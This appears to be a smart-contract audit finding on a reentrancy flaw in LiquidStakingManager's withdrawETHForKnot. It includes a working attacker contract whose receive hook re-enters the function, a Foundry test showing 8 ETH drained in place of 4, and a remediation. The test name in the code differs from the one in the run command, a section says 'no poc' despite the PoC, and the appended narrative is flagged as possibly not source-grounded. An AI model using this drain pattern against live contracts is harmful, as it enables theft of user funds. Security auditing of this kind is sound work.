---
id: 17128
severity: "High"
---

# Reentrancy in `LiquidStakingManager.sol#withdrawETHForKnow` leads to loss of fund from smart wallet

## Description

```solidity
/// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.
/// @dev A banned node runner cannot withdraw ETH for the KNOT. 
/// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn
function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {
    require(_recipient != address(0), "Zero address");
    require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");

    address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];
    require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");
    require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");
    require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");
    require(
        getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
        "Initials not registered"
    );

    // refund 4 ether from smart wallet to node runner's EOA
    IOwnableSmartWallet(associatedSmartWallet).rawExecute(
        _recipient,
        "",
        4 ether
    );

    // update the mapping
    bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

    emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);
}
```
Note the section:
```solidity
// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
    _recipient,
    "",
    4 ether
);

// update the mapping
bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;
```
If the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.

As shown in our running POC.

We need to add the import first:
```solidity
import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";
```
We can add the smart contract below:
```solidity
interface IManager {
    function registerBLSPublicKeys(
        bytes[] calldata _blsPublicKeys,
        bytes[] calldata _blsSignatures,
        address _eoaRepresentative
    ) external payable;
    function withdrawETHForKnot(
        address _recipient, 
        bytes calldata _blsPublicKeyOfKnot
    ) external;
}

contract NonEOARepresentative {

    address manager;
    bool state;

    constructor(address _manager) payable {

        bytes[] memory publicKeys = new bytes[](2);
        publicKeys[0] = "publicKeys1";
        publicKeys[1] = "publicKeys2";

        bytes[] memory signature = new bytes[](2);
        signature[0] = "signature1";
        signature[1] = "signature2";

        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(
            publicKeys,
            signature,
            address(this)
        );

        manager = _manager;

    }

    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {
        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
    }

    receive() external payable {
        if(!state) {
            state = true;
            this.withdraw("publicKeys1");
        }
    }

}
```
There is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling `withdrawETHForKnot`.

We add the test case.
```solidity
function testBypassIsContractCheck_POC() public {

    NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));
    address wallet = manager.smartWalletOfNodeRunner(address(pass));
    address reprenstative = manager.smartWalletRepresentative(wallet);
    console.log("smart contract registered as a EOA representative");
    console.log(address(reprenstative) == address(pass));

    // to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED
    MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);

    // expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER
    pass.withdraw("publicKeys1");
    console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");
    console.log(address(pass).balance);

}
```
We run the test:
```bash
forge test -vv --match testWithdraw_Reentrancy_POC
```
And the result is
```
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)
Logs:
  smart contract registered as a EOA representative
  true
  balance after the withdraw, expected 4 ETH, but has 8 ETH
  8000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 14.85ms
```
The function call is
`pass.withdraw("publicKeys1")`, which calls
```solidity
function withdraw(bytes calldata _blsPublicKeyOfKnot) external {
    IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
}
```
Which trigger:
```solidity
// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
    _recipient,
    "",
    4 ether
);
```
Which triggers reentrancy to withdraw the fund again before the public key is banned.
```solidity
receive() external payable {
    if(!state) {
        state = true;
        this.withdraw("publicKeys1");
    }
}
```

## Proof of Concept

no poc

## Recommendation

We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.
```solidity
// update the mapping
bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
    _recipient,
    "",
    4 ether
);
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract LiquidStakingManager exposes a function withdrawETHForKnot that allows a node runner to pull a fixed amount of 4 ether from the smart wallet that backs a registered KNOT. The function first validates the caller, checks that the associated smart wallet holds enough balance and that the BLS public key is in the INITIALS_REGISTERED lifecycle state. After these checks it performs an external call to the smart wallet via IOwnableSmartWallet.rawExecute, sending 4 ether to the address supplied as _recipient. Only after this external call does the contract update the bannedBLSPublicKeys mapping, effectively marking the BLS key as used and preventing further withdrawals. Because the state change (banning the key) occurs after the external call, a malicious contract supplied as the _recipient can execute code in its fallback/receive function and invoke withdrawETHForKnot again before the mapping is updated. This classic checks‑effects‑interactions violation creates a reentrancy window that lets the attacker repeat the 4 ether transfer multiple times, draining the smart wallet of twice the intended amount (or more if the fallback loops). The vulnerability is triggered only when the recipient is a contract, the node runner is not banned, the smart wallet balance is at least 4 ether, and the lifecycle status of the BLS key is INITIALS_REGISTERED. The impact is a loss of funds from the protocol’s smart wallet, breaking the accounting assumption that each KNOT can withdraw exactly one fixed payout. Users (node runners) expecting a single refund receive more ether than allowed, while the protocol suffers a net outflow and potential under‑collateralisation. The issue was discovered during a formal audit by Code4rena, where a proof‑of‑concept contract (NonEOARepresentative) was written to register a BLS key, call withdrawETHForKnot, and re‑enter the function from its receive hook, demonstrating that the balance after withdrawal doubled from the expected 4 ether to 8 ether. The bug can be hard to notice because the external call is deliberately placed before any state mutation, a pattern that often looks harmless in simple reading, and the reentrancy only manifests when a contract is used as the recipient. To remediate, the contract should follow the checks‑effects‑interactions pattern: update the bannedBLSPublicKeys mapping (or any other state that prevents further withdrawals) before performing the external call, and optionally protect the function with OpenZeppelin’s nonReentrant modifier. This eliminates the reentrancy window and ensures that each KNOT can withdraw at most the intended amount, preserving protocol accounting and user expectations.
